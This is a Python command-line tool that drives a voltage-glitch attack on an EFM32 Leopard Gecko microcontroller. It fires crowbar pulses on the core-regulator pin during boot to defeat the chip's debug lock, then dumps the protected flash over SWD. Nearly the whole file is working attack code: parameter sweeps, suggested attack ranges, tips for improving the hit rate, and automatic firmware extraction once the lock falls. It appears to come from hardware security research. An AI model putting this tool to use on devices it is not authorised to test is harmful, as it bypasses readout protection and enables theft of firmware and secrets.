#!/usr/bin/env python3
"""
efm32_glitch.py - Drive the EFM32 Leopard Gecko debug-unlock voltage glitch.

This is the primary attack from WORK/efm32_findings.md (FIND-EFM-001..004): a
crowbar on the DECOUPLE pin (core LDO) fired into the tRESET ~163 us boot window
corrupts the Debug Lock Word (DLW) latch so the AHB-AP comes up ENABLED. Flash is
then read over standard SWD WITHOUT triggering the AAP mass-erase. The sweep runs
on the Pico (src/efm32_target.c); this tool configures it, streams live progress,
and detects the '*** UNLOCKED' hit line.

Modes:
  info    - DPIDR + lock state + Device-Info page (part / flash / SRAM / UID).
  status  - one-line DPIDR + UNLOCKED/LOCKED.
  shot    - a single crowbar pulse for scope bring-up (power-cycle entry).
            Park a scope on DECOUPLE + the GP22 marker to see the droop first.
  shotrst - single pulse, nRST-reboot entry (trigger scope on GP15 release).
  sweep   - the full delay x width search (power-cycle entry, DEBUGUNLOCK).
  sweeprst- same, but reboot via nRST each attempt (VDD stays on; DEBUGUNLOCKRST).
  dump    - read flash/SRAM over the AHB-AP to a file (needs an unlocked part).
  aap     - scan AP IDRs for the Authentication Access Port.
  erase   - AAP DEVICEERASE recovery. DESTRUCTIVE (wipes all firmware). Opt-in.

Width is in 6.67 ns cycles @150 MHz, clamped by firmware to ~67 ns..3.0 us
(10..450 cyc). Delay is microseconds: for `sweep` from power-on (centre near
tRESET ~163 us), for `sweeprst` from the nRST release edge (tens of us).

Recommended first pass (wide, coarse), then bisect around any DISRUPT cluster:
  ./efm32_glitch.py sweep --d-start 100 --d-end 220 --d-step 1 \
      --w-start 10 --w-end 200 --w-step 10

Examples:
  ./efm32_glitch.py info
  ./efm32_glitch.py shot --delay 160 --width 100
  ./efm32_glitch.py sweep --dump-on-hit dump.bin --dump-size 0x10000
  ./efm32_glitch.py dump --addr 0 --size 0x40000 --out flash.bin
"""

import argparse
import os
import sys
import time

from colors import ColorHelpFormatter
from efm32_link import EfmLink, add_common_args, project_path


def _live(line):
    print(line)


def do_info(link, args):
    i = link.info()
    if not i["connected"]:
        print("EFM32: NOT CONNECTED (no DPIDR). Check SWD wiring / target power.")
        return 1
    print(i["raw"].strip())
    return 0


def do_status(link, args):
    dpidr, unlocked = link.status()
    if dpidr is None:
        print("EFM32: NOT CONNECTED")
        return 1
    print(f"DPIDR=0x{dpidr:08X}  {'UNLOCKED' if unlocked else 'LOCKED'}")
    return 0


def do_shot(link, args):
    print(f"Single crowbar shot (power-cycle): delay={args.delay} us width={args.width} cyc")
    print("Probe DECOUPLE on the scope; GP22 (GLITCH_FIRED) is the trigger marker.")
    print(link.shot(args.delay, args.width).strip())
    return 0


def do_shotrst(link, args):
    print(f"Single crowbar shot (nRST reboot): delay={args.delay} us width={args.width} cyc "
          f"hold={args.hold} us")
    print("Trigger the scope on GP15 (nRST) release; probe DECOUPLE.")
    print(link.shot_reset(args.delay, args.width, args.hold).strip())
    return 0


def _run_sweep(link, args, reset):
    dpidr, unlocked = link.status()
    if dpidr is None:
        print("EFM32: NOT CONNECTED - check SWD wiring / target power first.")
        return 1
    if unlocked:
        print("NOTE: part already reads UNLOCKED (AHB-AP open). Nothing to glitch;")
        print("      use `dump` to read it directly. (Firmware will also pre-flight ABORT.)")
    entry = "nRST reboot (VDD stays on)" if reset else "power-cycle"
    print(f"Sweep [{entry}]: delay {args.d_start}..{args.d_end} us step {args.d_step} | "
          f"width {args.w_start}..{args.w_end} cyc step {args.w_step}")
    print("Crowbar GP2 -> DECOUPLE. Streaming firmware output (Ctrl-C stops the host;")
    print("power-cycle the Pico to abort the on-chip sweep). Width inner / delay outer.\n")

    transcript = link.glitch_unlock(
        args.d_start, args.d_end, args.d_step,
        args.w_start, args.w_end, args.w_step,
        args.hold if reset else args.off, args.settle, args.max,
        reset=reset, on_line=_live,
    )

    if "*** UNLOCKED" in transcript:
        hit = next((l for l in transcript.splitlines() if "UNLOCKED on attempt" in l), "")
        print("\n>>> HIT:", hit.strip())
        if args.dump_on_hit:
            out = args.dump_on_hit if os.path.dirname(args.dump_on_hit) else project_path(args.dump_on_hit)
            print(f"Dumping 0x{args.dump_size:X} bytes from 0x{args.dump_addr:08X} -> {out}")
            data = link.dump(args.dump_addr, args.dump_size,
                             progress=lambda g, t: print(f"  {g}/{t}", end="\r"))
            with open(out, "wb") as f:
                f.write(data)
            nz = sum(1 for b in data if b not in (0x00, 0xFF))
            print(f"\nSaved {len(data)} bytes, {nz} non-trivial.")
        return 0

    if "*** ABORT" in transcript:
        return 0  # already open; firmware printed the reason
    print("\nNo unlock this run. Narrow the delay around any DISRUPT cluster, drop the")
    print("DECOUPLE cap for a faster edge, or run target VDD nearer 2.0 V (FIND-EFM-004).")
    return 2


def do_sweep(link, args):
    return _run_sweep(link, args, reset=False)


def do_sweeprst(link, args):
    return _run_sweep(link, args, reset=True)


def do_dump(link, args):
    # default: a UNIQUE timestamped file in scripts/efm32/ so dumps never overwrite old findings
    out = args.out if (args.out and os.path.dirname(args.out)) \
        else project_path(args.out or f"efm32_dump_{time.strftime('%Y%m%d_%H%M%S')}.bin")
    print(f"Dumping 0x{args.size:X} bytes from 0x{args.addr:08X} -> {out}")
    data = link.dump(args.addr, args.size,
                     progress=lambda g, t: print(f"  {g}/{t}", end="\r"))
    with open(out, "wb") as f:
        f.write(data)
    nz = sum(1 for b in data if b not in (0x00, 0xFF))
    print(f"\nSaved {len(data)} bytes, {nz} non-trivial.")
    return 0


def do_aap(link, args):
    print(link.aap_probe().strip())
    return 0


def do_erase(link, args):
    if not args.yes:
        print("REFUSING: AAP DEVICEERASE mass-erases the device (ALL firmware lost).")
        print("This is the recovery path, NOT the readout attack. Re-run with --yes to confirm.")
        return 1
    print("AAP DEVICEERASE (destructive mass-erase + debug unlock)...")
    ok = link.device_erase()
    print("Result:", "UNLOCKED (debug open, flash blank)" if ok else "did not unlock")
    return 0 if ok else 2


def _add_sweep_args(sp, reset):
    if reset:
        sp.add_argument("--d-start", type=int, default=0, dest="d_start",
                        help="delay start us from nRST release (default 0)")
        sp.add_argument("--d-end", type=int, default=200, dest="d_end")
    else:
        sp.add_argument("--d-start", type=int, default=100, dest="d_start",
                        help="delay start us from power-on (default 100; tRESET~163)")
        sp.add_argument("--d-end", type=int, default=220, dest="d_end")
    sp.add_argument("--d-step", type=int, default=1, dest="d_step")
    sp.add_argument("--w-start", type=int, default=10, dest="w_start", help="width cyc (~67ns floor)")
    sp.add_argument("--w-end", type=int, default=200, dest="w_end")
    sp.add_argument("--w-step", type=int, default=10, dest="w_step")
    sp.add_argument("--off", type=int, default=50, help="power-off ms per cycle (sweep)")
    sp.add_argument("--hold", type=int, default=200, help="nRST hold us (sweeprst)")
    sp.add_argument("--settle", type=int, default=20 if not reset else 8,
                    help="settle ms before SWD probe")
    sp.add_argument("--max", type=int, default=0,
                    help="max attempts (0 = one full grid pass, computed by firmware)")
    sp.add_argument("--dump-on-hit", default=None, help="on a hit, dump to this file")
    sp.add_argument("--dump-addr", type=lambda x: int(x, 0), default=0,
                    help="dump start addr on hit (default 0 = flash base)")
    sp.add_argument("--dump-size", type=lambda x: int(x, 0), default=0x10000,
                    help="bytes to dump on hit (default 0x10000)")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=ColorHelpFormatter)
    add_common_args(ap)
    sub = ap.add_subparsers(dest="mode")

    sub.add_parser("info", help="DPIDR + lock state + DI page")
    sub.add_parser("status", help="one-line DPIDR + lock state")
    sub.add_parser("aap", help="scan AP IDRs for the AAP")

    sp = sub.add_parser("sweep", help="delay x width debug-unlock sweep (power-cycle)")
    _add_sweep_args(sp, reset=False)
    spr = sub.add_parser("sweeprst", help="same, via nRST reboot (VDD stays on)")
    _add_sweep_args(spr, reset=True)

    st = sub.add_parser("shot", help="single crowbar pulse, power-cycle (scope)")
    st.add_argument("--delay", type=int, default=160, help="delay us (default 160)")
    st.add_argument("--width", type=int, default=100, help="width cyc (default 100)")

    sr = sub.add_parser("shotrst", help="single crowbar pulse, nRST reboot (scope)")
    sr.add_argument("--delay", type=int, default=50, help="delay us from nRST release (default 50)")
    sr.add_argument("--width", type=int, default=100, help="width cyc (default 100)")
    sr.add_argument("--hold", type=int, default=200, help="nRST hold us (default 200)")

    dp = sub.add_parser("dump", help="read memory over AHB-AP to a file")
    dp.add_argument("--addr", type=lambda x: int(x, 0), default=0, help="start addr (default 0)")
    dp.add_argument("--size", type=lambda x: int(x, 0), default=0x10000, help="bytes (default 0x10000)")
    dp.add_argument("--out", default=None, help="output file (default scripts/efm32/efm32_dump.bin)")

    ep = sub.add_parser("erase", help="AAP DEVICEERASE recovery (DESTRUCTIVE)")
    ep.add_argument("--yes", action="store_true", help="confirm the destructive mass-erase")

    args = ap.parse_args()
    if args.mode is None:
        ap.print_help()
        return 0

    link = EfmLink(port=args.port, verbose=args.verbose)
    try:
        return {
            "info": do_info, "status": do_status, "aap": do_aap,
            "sweep": do_sweep, "sweeprst": do_sweeprst,
            "shot": do_shot, "shotrst": do_shotrst,
            "dump": do_dump, "erase": do_erase,
        }[args.mode](link, args)
    finally:
        link.close()


if __name__ == "__main__":
    sys.exit(main())
